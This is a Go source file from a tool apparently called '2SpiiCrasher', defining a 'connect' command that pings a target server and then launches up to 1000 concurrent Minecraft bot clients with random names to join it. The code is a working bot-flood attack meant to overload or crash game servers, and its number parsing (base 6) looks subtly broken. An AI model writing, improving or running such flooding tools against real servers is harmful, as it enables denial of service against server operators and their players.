package commands

import (
	"2SpiiCrasher/functions"
	"2SpiiCrasher/messages"
	"fmt"
	"github.com/Tnze/go-mc/bot"
	"github.com/spf13/cobra"
	"github.com/tatsushid/go-fastping"
	"log"
	"net"
	"strconv"
	"sync"
	"time"
)

var connectCommand = &cobra.Command{
	Use:     "connect",
	Short:   "Allows you to connect a number of bots defined on a target IP",
	Long:    "Allows you to connect a number of bots defined on a target IP",
	Example: "2spiicrasher connect 100 play.myserver.net",
	Args:    cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		mountBot, err := strconv.ParseInt(args[0], 6, 12)
		if err != nil {
			log.Fatalln(err)
		}

		if mountBot > 1000 || mountBot == 0 {
			log.Fatalln(messages.MountBotTooHigh)
		}

		serverIPTarget := args[1]
		ping := fastping.NewPinger()
		resolveAddress, err := net.ResolveIPAddr("ip", serverIPTarget)
		if err != nil {
			log.Fatalln(err)
		}

		ping.AddIPAddr(resolveAddress)
		ping.OnRecv = func(addr *net.IPAddr, duration time.Duration) {
			fmt.Println(messages.PingRequestWaitingResponse + fmt.Sprintf(" (Target IP: %s) (Duration: %v)", resolveAddress, duration))
		}

		ping.OnIdle = func() {
			fmt.Println(messages.PositiveAnswer)
		}

		err = ping.Run()
		if err != nil {
			log.Fatalln(err)
		}

		waitGroup := sync.WaitGroup{}
		waitGroup.Add(int(mountBot))

		for i := 0; i < int(mountBot); i++ {
			go func() {
				botClient := bot.NewClient()
				botClient.Auth = bot.Auth{
					Name: functions.RandomString(6),
				}

				err := botClient.JoinServer(resolveAddress.String())
				if err != nil {
					fmt.Println(err)
					waitGroup.Done()
					return
				}

				fmt.Println(fmt.Sprintf("» BOT: %s  |  STATUS: CONNECTED", botClient.Name))

				botClient.HandleGame()

				waitGroup.Done()
			}()
		}

		waitGroup.Wait()
		return
	},
}

func init() {
	rootCommand.AddCommand(connectCommand)
}
